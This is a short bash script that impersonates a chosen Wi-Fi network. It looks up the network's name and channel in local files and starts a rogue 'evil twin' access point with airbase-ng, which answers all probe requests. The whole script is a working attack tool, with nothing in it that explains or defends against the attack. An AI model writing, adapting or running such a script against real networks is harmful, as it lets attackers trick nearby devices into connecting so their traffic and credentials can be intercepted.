#!/bin/bash

echo "Choose which network to fake."
cat network-list.txt

read -r input

ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)

awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
#cat combined.txt
targetESSID=$ssid
targetChannel=$( awk -F " " 'FNR<2{print $2}' combined.txt)
interface=$(cat interfaceToUse.txt)
echo "Starting the twin :)"

airbase-ng -e $targetESSID -c $targetChannel -P $interface
